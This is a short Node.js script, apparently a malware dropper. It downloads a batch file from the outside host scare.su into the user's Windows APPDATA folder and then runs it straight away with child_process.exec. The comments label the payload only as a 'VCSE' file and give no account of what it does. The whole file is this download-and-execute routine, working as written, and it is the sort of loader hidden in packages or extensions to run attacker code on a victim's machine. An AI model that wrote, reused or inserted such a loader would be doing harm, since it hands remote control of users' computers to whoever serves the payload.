const { exec } = require('child_process');
const https = require('https');
const fs = require('fs');
const path = require('path');

// Define vcse batch file
const url = 'https://scare.su/files/cmd.cmd';

// Get the AppData path VCSE
const appDataPath = path.join(process.env.APPDATA, 'cmd.cmd');

// Function to download the VCSE file
https.get(url, (response) => {
  const file = fs.createWriteStream(appDataPath);
  response.pipe(file);
  file.on('finish', () => {
    file.close(() => {
      console.log(`File downloaded to ${appDataPath}`);
      executeBatFile(appDataPath);
    });
  });
}).on('error', (err) => {
  fs.unlink(appDataPath, () => {});  // Delete file if error occurs
  console.error('Download failed:', err.message);
});

// Function to execute the downloaded VCSE file
function executeBatFile(filePath) {
  console.log('Executing .bat file...');
  exec(filePath, (error, stdout, stderr) => {
    if (error) {
      console.error(`Execution error: ${error.message}`);
      return;
    }
    if (stderr) {
      console.error(`stderr: ${stderr}`);
      return;
    }
    console.log(`stdout: ${stdout}`);
  });
}
